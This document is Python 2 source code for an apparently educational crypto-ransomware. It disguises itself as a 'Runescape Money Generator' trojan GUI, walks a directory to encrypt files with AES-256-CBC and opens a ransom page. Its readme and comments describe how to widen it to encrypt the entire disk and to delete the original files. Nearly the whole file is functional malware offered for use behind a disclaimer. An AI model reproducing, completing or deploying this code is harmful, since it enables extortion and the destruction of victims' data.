#!/usr/bin/python
import os, random, struct, hashlib, time, win32api, webbrowser, ttk
import Tkinter as tk
from Tkinter import *
from Crypto.Cipher import AES

extensions = ['.txt'] # Testing only with txt files
homedir = "C:\Users\Python\Desktop\Ransom\File" #Testing only under this directory
path = os.path.join(homedir, "firstdir")
url = "https://github.com/luisxciv/SYrans" #Ransom page to display with price, BTC address etc...
new = 2 # opens in new tab (if possible)
LARGE_FONT= ("Courier", 10)

def encryption(key):
    app = TrojanApp()
    app.geometry('500x420')
    app.mainloop()
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        for root, dirs, files in os.walk(homedir):
            for file in files:
                if file.endswith(tuple(extensions)):
                    in_filename = (os.path.join(root, file))

                    print "[+] - Files found = [+]"
                    print in_filename
    
                    #Prints the files in the dir
                    print "[!] - Encrypting files..."
                    # Encrypts the file and adds .enc extension
                    encrypt(key,in_filename)
                    print "[+] - Files are now encrypted."
                    #

                    print "[!] - Deleting Original Files..."
                # Uncomment the line below to remove the original files (If you don't know how to decrypt with python using AES 256-CBC then dont uncomment.
                   # os.remove(os.path.join(root, file))
                    print "[+] - Original files deleted."
    
                    #Proceeds to next dir
                    seconds = int(1)
                    print "[+] - Next encryption in %s second" %seconds
                    time.sleep(seconds)
                    print

    print "[+] - All files are now encrypted and replaced with a .enc file extension"
    webbrowser.open(url, new=new)

#Encryption algorythm (AES-CBC 256)
def encrypt(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

		
def cancel():
    app.destroy()


LARGE_FONT = ("Verdana", 12)

#Trojan App sample used from github

class TrojanApp(tk.Tk):
    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)

        #tk.Tk.iconbitmap(self,default='C:\Python27\Lib\idlelib\Icons\phone.ico')
        tk.Tk.wm_title(self, "Runescape Money Generator - 2017 ")

        container = tk.Frame(self)
        container.pack(side="top", fill="both", expand=True)
        container.grid_rowconfigure(0, weight=1)
        container.grid_columnconfigure(0, weight=1)

        self.frames = {}

        for F in (StartPage, PageOne):
            frame = F(container, self)
            self.frames[F] = frame
            frame.grid(row=0, column=0, sticky="nsew")

        self.show_frame(StartPage)

    def show_frame(self, cont):
        frame = self.frames[cont]
        frame.tkraise()


class StartPage(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)

        label = tk.Label(self, text="Agreement License & Disclaimer / Readme", font=LARGE_FONT)
        label.pack(pady=10, padx=10)

        txt = tk.Text(self, borderwidth=3, relief="sunken")
        txt.insert("1.0",
                   " Note: This project is purely academic, use at your own risk. I do not encourage in any way the use of this software illegally or to attack targets without their previous authorization.\n")
        txt.insert("2.0",
                   "This project aims to build a functional crypto-ransomware for educational purposes, written in Python. Basically, it will encrypt your files in background using AES-256-CBC. I implemented a fake GUI which you are reading now can be configured to your taste, feel free to use tk to make it more complex. You could add a loading bar. This ransomware will encrypt all files that match the extension arguments within a given directory. The directory path can be set to (~/) to encrypt the entire disk and the extension can be set to (.*). The ransomware will also open a browser page where the ransom would take place (BTC Address), i have made it link to my repo. The ransomware will also leave a .txt file with a message behind on every folder where files are encrypted, all customizable of course. ")
        txt.insert("3.0",
                   " I am not responsible for whatever you decide to do with this code, \n")
        txt.insert("4.0",
                   " Original repo: https://github.com/luisxciv/SYrans, \n")
        txt.config(font=("consolas", 11), undo=True, wrap='word', state="disabled")
        txt.grid(row=0, column=0, sticky="ew", padx=2, pady=2)
        txt.pack()



        button = ttk.Button(self, text="Continue",
                            command=lambda: controller.show_frame(PageOne))
        button.pack()

        button2 = ttk.Button(self, text="Cancel",
                             command=cancel)
        button2.pack()


class PageOne(tk.Frame):
    def __init__(self, parent, controller):
        tk.Frame.__init__(self, parent)
        label = ttk.Label(self, text="Checking System Configuration...\nPlease be patient", font=LARGE_FONT)
        label.pack(pady=10, padx=10)

        self.progress = ttk.Progressbar(self, orient="horizontal",
                                        length=200, mode="determinate")
        self.progress.pack()

        self.bytes = 0
        self.maxbytes = 0
        self.start()

    def start(self):
        self.progress["value"] = 0
        self.maxbytes = 50000
        self.progress["maximum"] = 50000
        self.read_bytes()

    def read_bytes(self):
        '''simulate reading 500 bytes; update progress bar'''
        self.bytes += 50
        self.progress["value"] = self.bytes
        if self.bytes < self.maxbytes:
            # read more bytes after 100 ms
            self.after(200, self.read_bytes)

def password():
    # Uncomment for password input and comment the line after that (which is the encryption def pass)
    #password = raw_input('Enter encryption password: ')
    password = "123"
    key = hashlib.sha256(password).digest()
    encryption(key)
def main():
    password()


main()

